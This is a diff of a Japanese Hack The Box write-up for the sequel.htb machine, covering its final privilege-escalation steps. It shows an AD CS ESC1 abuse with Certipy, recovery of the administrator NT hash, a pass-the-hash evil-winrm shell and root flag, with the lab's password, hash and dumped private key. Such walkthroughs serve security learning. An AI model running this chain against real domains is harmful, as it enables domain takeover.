@@ -446,8 +446,7 @@ Certificate Templates
     [!] Vulnerabilities
       ESC1                              : Enrollee supplies subject and template allows client authentication.
 ```
-administratorのpfx取得  
-pfxから取り出せるpemを使用したpassthecertiricateでwinrmログインも考えたが、5986番は開いていなかったので断念
+administratorのpfxを取得できた
 ```sh
 └─$ certipy-ad req -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -out administrator -target 10.129.80.180 -u ryan.cooper -p NuclearMosquito3
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -461,6 +460,37 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'administrator.pfx'
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
+pfxからntハッシュを取得できた
+```sh
+└─$ certipy-ad auth -pfx administrator.pfx -no-save -dc-ip 10.129.80.180            
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+winrmログイン成功  
+ルートフラグゲット
+```sh
+└─$ evil-winrm -i 10.129.80.180 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
+b5a13a12aae3171df977e2c051d44261
+```
+
+
+## おまけ
 ```sh
 └─$ openssl pkcs12 -in administrator.pfx -passin pass:'' -info -nodes
 MAC: sha256, Iteration 2048
@@ -542,27 +572,181 @@ nt93DXuBYgFnL+WoZzeFIg==
 -----END PRIVATE KEY-----
 ```
 ```sh
-└─$ certipy-ad auth -pfx administrator.pfx -no-save -dc-ip 10.129.80.180            
-Certipy v5.0.3 - by Oliver Lyak (ly4k)
+└─$ openssl pkcs12 -in administrator.pfx -out cert.crt -passin pass:'' -nokeys -clcerts
 
-[*] Certificate identities:
-[*]     SAN UPN: 'administrator@sequel.htb'
-[*] Using principal: 'administrator@sequel.htb'
-[*] Trying to get TGT...
-[*] Got TGT
-[*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+└─$ openssl x509 -in cert.crt -nocert -text                     
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            1e:00:00:00:11:10:34:7b:ea:ae:d7:35:5f:00:00:00:00:00:11
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: DC=htb, DC=sequel, CN=sequel-DC-CA
+        Validity
+            Not Before: Oct 25 11:13:13 2025 GMT
+            Not After : Oct 23 11:13:13 2035 GMT
+        Subject: CN=Ryan.cooper
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:ba:ac:15:da:6c:ea:bf:ac:9d:a8:43:8a:cd:df:
+                    df:f1:3c:5b:11:57:6a:ae:1d:8e:aa:af:bf:bc:47:
+                    10:db:a0:02:a2:04:2d:34:e8:20:f5:dd:d7:b6:62:
+                    2b:e6:95:57:ab:60:e8:34:f0:d8:93:e4:59:98:55:
+                    93:5c:20:38:0b:12:52:8f:70:34:0a:74:19:1d:b6:
+                    97:6d:5a:a4:77:23:16:5e:7f:12:8a:5b:b8:53:1b:
+                    16:cf:23:a5:c3:86:35:50:fd:7a:85:60:0b:e2:92:
+                    67:9f:5e:9f:65:7d:f4:f9:e8:c3:63:de:6f:77:4c:
+                    3c:f0:0c:2b:fb:0a:c7:a3:db:85:40:dd:4c:69:e8:
+                    f0:d5:58:e4:b8:72:73:f9:da:ab:16:14:57:06:54:
+                    35:fc:45:b0:57:ae:f0:31:24:ad:fd:26:58:41:40:
+                    be:75:e5:4b:4d:dd:df:47:c4:45:b5:9f:28:5a:c8:
+                    cd:92:b3:0d:e2:b4:8f:99:b8:ea:62:77:c2:23:c7:
+                    ef:0d:c1:9b:d9:11:c4:ed:1b:45:98:6a:26:39:df:
+                    4a:68:a3:ab:4a:de:38:73:1b:69:35:30:f5:f0:76:
+                    39:c6:02:80:e4:04:63:90:32:44:45:88:ba:ba:12:
+                    f0:9c:52:65:95:95:09:a1:ab:91:90:97:ac:94:fe:
+                    99:0d
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Subject Alternative Name: 
+                othername: UPN:administrator@sequel.htb
+            X509v3 Subject Key Identifier: 
+                6E:76:9F:6A:12:FE:0D:EA:D1:3B:73:54:B2:5F:CE:E8:51:55:5A:8B
+            X509v3 Authority Key Identifier: 
+                62:9F:32:A3:A0:F0:38:20:D4:60:C0:CD:6D:C5:FA:51:30:5E:C3:15
+            X509v3 CRL Distribution Points: 
+                Full Name:
+                  URI:ldap:///CN=sequel-DC-CA,CN=dc,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint
+
+            Authority Information Access: 
+                CA Issuers - URI:ldap:///CN=sequel-DC-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?cACertificate?base?objectClass=certificationAuthority
+            X509v3 Key Usage: critical
+                Digital Signature, Key Encipherment
+            Microsoft certificate template: 
+                0..&+.....7.....v...V...5...Y...5.w......)..e...
+            X509v3 Extended Key Usage: 
+                TLS Web Client Authentication, E-mail Protection, Microsoft Encrypted File System
+            Microsoft Application Policies Extension: 
+                0&0
+..+.......0
+..+.......0..
++.....7
+..
+            S/MIME Capabilities: 
+......0...+....0050...*.H..
+..*.H..
+    Signature Algorithm: sha256WithRSAEncryption
+    Signature Value:
+        63:2f:70:32:52:f9:7c:05:d8:b3:76:9f:6e:54:fb:92:36:5f:
+        20:09:75:a2:55:fa:ff:0e:c1:15:c6:38:60:65:9c:f2:b4:26:
+        40:3f:e9:10:39:2b:15:0d:ed:0c:93:dc:37:82:4a:49:0c:e2:
+        66:23:cd:95:c6:22:72:bf:96:f1:e9:5c:4a:7f:5f:9f:86:35:
+        95:64:83:9c:d9:62:30:20:dc:a7:58:2b:94:23:25:e4:70:da:
+        96:ff:29:e3:e9:4f:c3:46:ad:02:8b:05:71:b8:ec:a3:1c:03:
+        5a:dd:2e:60:d8:34:3f:e1:40:ac:6a:61:cc:ed:b8:f1:8a:7b:
+        9f:c5:07:28:02:f1:c9:19:ad:60:43:07:88:aa:7c:c9:6c:32:
+        fa:2d:25:db:32:f0:15:c8:9a:10:33:d9:bc:c5:05:76:3e:6c:
+        b4:7f:55:ae:ab:f2:e4:c6:5c:a8:a6:d0:de:ca:b9:f0:8e:7d:
+        a0:e5:4b:12:64:54:b8:48:c3:7c:18:99:3e:26:5d:d5:9b:b4:
+        1e:45:f4:3c:5f:4e:ed:fb:25:01:07:92:ef:4a:e6:08:f0:d2:
+        5b:46:11:9a:a3:03:8a:12:e1:71:b6:08:fb:36:8a:78:67:d8:
+        47:65:41:58:0e:da:d1:da:58:ba:ca:82:bf:72:a0:7f:a0:37:
+        74:fb:d4:b2
 ```
 ```sh
-└─$ evil-winrm -i 10.129.80.180 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
-                                        
-Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
-b5a13a12aae3171df977e2c051d44261
+└─$ openssl pkcs12 -in administrator.pfx -out privkey.pem -passin pass:'' -nocerts -nodes
+
+└─$ openssl rsa -in privkey.pem -noout -text 
+Private-Key: (2048 bit, 2 primes)
+modulus:
+    00:ba:ac:15:da:6c:ea:bf:ac:9d:a8:43:8a:cd:df:
+    df:f1:3c:5b:11:57:6a:ae:1d:8e:aa:af:bf:bc:47:
+    10:db:a0:02:a2:04:2d:34:e8:20:f5:dd:d7:b6:62:
+    2b:e6:95:57:ab:60:e8:34:f0:d8:93:e4:59:98:55:
+    93:5c:20:38:0b:12:52:8f:70:34:0a:74:19:1d:b6:
+    97:6d:5a:a4:77:23:16:5e:7f:12:8a:5b:b8:53:1b:
+    16:cf:23:a5:c3:86:35:50:fd:7a:85:60:0b:e2:92:
+    67:9f:5e:9f:65:7d:f4:f9:e8:c3:63:de:6f:77:4c:
+    3c:f0:0c:2b:fb:0a:c7:a3:db:85:40:dd:4c:69:e8:
+    f0:d5:58:e4:b8:72:73:f9:da:ab:16:14:57:06:54:
+    35:fc:45:b0:57:ae:f0:31:24:ad:fd:26:58:41:40:
+    be:75:e5:4b:4d:dd:df:47:c4:45:b5:9f:28:5a:c8:
+    cd:92:b3:0d:e2:b4:8f:99:b8:ea:62:77:c2:23:c7:
+    ef:0d:c1:9b:d9:11:c4:ed:1b:45:98:6a:26:39:df:
+    4a:68:a3:ab:4a:de:38:73:1b:69:35:30:f5:f0:76:
+    39:c6:02:80:e4:04:63:90:32:44:45:88:ba:ba:12:
+    f0:9c:52:65:95:95:09:a1:ab:91:90:97:ac:94:fe:
+    99:0d
+publicExponent: 65537 (0x10001)
+privateExponent:
+    16:67:29:2f:3f:e3:93:71:da:b0:f3:3c:31:15:85:
+    69:8c:fa:0b:f4:7f:0d:da:e7:c0:95:db:8f:b3:c2:
+    b2:ec:fa:eb:e9:4e:e8:9a:d4:3b:d5:ae:3a:0a:01:
+    a5:48:76:8f:4f:8f:c6:ac:c1:fd:4b:ca:31:e5:51:
+    4c:5c:e4:84:f5:a3:b9:69:b8:a1:29:8a:4b:1d:db:
+    02:09:7f:13:fa:3e:c8:c3:fc:dc:64:82:14:5d:3b:
+    a9:4b:e8:ac:b4:ca:68:c8:27:00:63:44:c1:e2:1a:
+    b4:0e:75:d8:47:1b:d3:b3:4a:e1:cd:33:f8:f0:0a:
+    1f:30:02:c6:3b:e6:b6:44:21:6b:cb:de:37:bf:95:
+    8c:0e:05:48:8a:17:22:65:f8:8e:28:09:e0:2d:94:
+    3e:cd:64:9c:e4:ba:95:15:f0:c7:09:21:f8:38:e9:
+    0b:ec:29:21:64:af:e8:f6:c6:a6:5f:2b:11:37:0b:
+    e7:f6:84:46:76:3b:93:43:11:90:ce:60:1d:33:9b:
+    c1:83:2c:6b:62:83:61:c0:4f:25:65:b2:0f:61:fe:
+    50:c7:1b:9b:5a:30:e7:22:13:3d:98:ec:75:a6:08:
+    80:00:d1:86:c1:5b:53:38:66:b6:34:a3:c0:63:1f:
+    24:84:82:60:13:21:73:f5:06:62:09:8f:9e:de:62:
+    e9
+prime1:
+    00:e5:3f:5e:ca:fd:fc:02:ef:6c:7d:91:3b:62:a0:
+    7d:06:98:79:66:17:d5:a2:4f:90:22:83:6c:6f:77:
+    fc:84:11:09:32:db:d9:ae:07:c2:6a:83:d3:dc:5a:
+    a2:e1:5d:a9:f4:03:97:e0:01:77:bf:a1:a2:04:33:
+    f5:59:dc:d3:61:57:ff:a2:d1:ca:d8:28:de:7d:01:
+    11:5b:09:31:75:63:0c:f6:d3:ec:fd:19:0d:cb:e7:
+    2e:86:5e:a6:85:86:4e:6b:04:8e:95:e6:a5:07:d5:
+    e2:70:65:7c:8e:3c:6d:80:40:c8:ae:29:4c:f1:4a:
+    7a:ae:f7:ae:6e:8c:fe:22:e5
+prime2:
+    00:d0:74:cd:9a:fe:19:12:44:2a:26:f7:53:11:e2:
+    f1:99:a5:df:5b:42:78:69:55:50:0c:06:8d:4c:a9:
+    07:4b:64:0c:83:85:ad:96:63:4e:a5:45:e4:1d:8b:
+    bb:5f:bb:b3:1e:04:2c:53:9d:25:96:97:e5:04:37:
+    7b:d9:a1:23:9e:b1:2e:ea:66:00:94:75:7a:33:f8:
+    30:74:ea:50:16:11:da:ad:42:3d:26:2b:2e:4f:29:
+    47:ce:38:a4:d9:a4:08:dd:9e:f3:0e:fa:40:6d:3e:
+    8e:5a:e1:bc:9c:6c:5e:04:da:b7:19:b1:05:f6:dc:
+    a3:b2:34:46:16:d2:30:f3:09
+exponent1:
+    38:6d:0f:a5:01:3c:fd:6f:f7:11:35:25:1b:d2:8a:
+    d3:8b:c6:1d:c5:f2:14:80:66:e6:c7:d8:71:db:63:
+    b1:12:0c:64:93:4e:92:12:60:dd:1c:d3:91:e2:51:
+    43:0d:6d:de:9c:df:ce:08:2e:74:61:91:62:5d:73:
+    9f:89:c6:11:a8:ba:48:56:41:0a:51:8c:e9:d1:d0:
+    76:ca:dd:7c:9a:43:bf:a1:4c:2c:c3:f4:ec:62:5b:
+    c6:41:17:d5:b7:c8:27:79:38:ab:56:d8:fa:03:c0:
+    37:90:13:47:63:42:44:96:2d:8f:08:a5:62:a2:c5:
+    6d:b9:93:1a:ac:e3:84:ad
+exponent2:
+    6d:c7:b5:a8:14:7d:7b:a3:2e:57:cb:14:92:6c:e4:
+    33:b8:a9:42:54:65:39:83:d6:5e:1e:ed:37:1c:25:
+    5d:4c:d9:52:42:8a:42:93:16:0d:f0:1a:cc:7c:94:
+    37:3c:90:7e:14:50:8b:d0:4c:c5:5c:45:1d:cd:62:
+    8a:20:54:b3:f4:37:f2:f5:b9:04:76:41:df:30:ab:
+    c4:46:c9:da:75:98:a6:7a:25:dd:fe:0b:ab:60:e0:
+    11:f8:be:c8:67:9c:cb:aa:33:f3:05:53:fc:b4:5f:
+    1f:f9:95:ed:03:1d:18:8d:5e:b4:47:08:0f:13:ef:
+    99:9f:f1:f1:7e:cc:8c:91
+coefficient:
+    43:f2:b7:9c:2f:d0:c0:0d:06:41:26:8f:f1:10:83:
+    19:06:1b:25:6b:7b:2d:14:64:1e:34:c3:0c:9f:b3:
+    13:05:67:fa:6c:5c:e0:5d:c9:b3:02:32:2d:4b:cd:
+    d4:8c:e4:09:b7:e8:25:47:cf:1b:e6:75:e3:89:d5:
+    e6:b6:7d:08:70:3a:e2:d1:03:34:b8:00:0f:b3:58:
+    8f:57:b3:90:99:a8:92:7b:93:83:76:c0:fb:08:40:
+    ec:43:32:5e:a4:b8:da:e9:59:a3:19:d1:54:d4:dd:
+    48:2d:18:16:33:68:e2:9e:df:77:0d:7b:81:62:01:
+    67:2f:e5:a8:67:37:85:22
 ```
